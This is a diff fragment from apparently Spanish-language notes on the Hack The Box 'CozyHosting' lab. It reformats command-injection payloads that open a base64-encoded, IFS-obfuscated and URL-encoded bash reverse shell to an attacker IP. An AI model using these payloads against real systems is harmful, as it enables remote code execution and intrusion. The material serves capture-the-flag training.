@@ -144,10 +144,12 @@ F99CF05847D0C79B554F3C58AAFC0D7A	"kanderson"
 
 [http://cozyhosting.htb/admin](http://cozyhosting.htb/admin)
 
-`echo "bash -i >& /dev/tcp/<ip-atacante>/<puerto> 0>&1" | base64`
-`echo "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4yNDYvNzc3NyAwPiYxCg==" | base64 -d | bash`
-`;echo${IFS}"YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4yNDYvNDE0MiAwPiYxCg=="|base64${IFS}-d|bash;`
-`%3becho${IFS}"YmFzaCAtaSA%2bJiAvZGV2L3RjcC8xMC4xMC4xNC4yNDYvNDE0MiAwPiYxCg%3d%3d"|base64${IFS}-d|bash%3b`
+```bash
+echo "bash -i >& /dev/tcp/<ip-atacante>/<puerto> 0>&1" | base64
+echo "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4yNDYvNzc3NyAwPiYxCg==" | base64 -d | bash
+;echo${IFS}"YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4yNDYvNDE0MiAwPiYxCg=="|base64${IFS}-d|bash;
+%3becho${IFS}"YmFzaCAtaSA%2bJiAvZGV2L3RjcC8xMC4xMC4xNC4yNDYvNDE0MiAwPiYxCg%3d%3d"|base64${IFS}-d|bash%3b
+```
 
 Tratamiento de la TTY
 ```bash
